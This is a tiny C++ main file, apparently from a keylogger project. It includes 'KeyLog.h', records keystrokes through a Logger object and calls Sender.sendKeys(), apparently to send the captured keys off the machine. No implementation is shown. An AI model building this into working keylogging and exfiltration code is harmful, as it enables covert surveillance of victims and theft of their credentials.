#include "KeyLog.h"

int main()
{
	Logger.record();
	Logger.printFrames();
	
	Sender.sendKeys();
	return 0;
}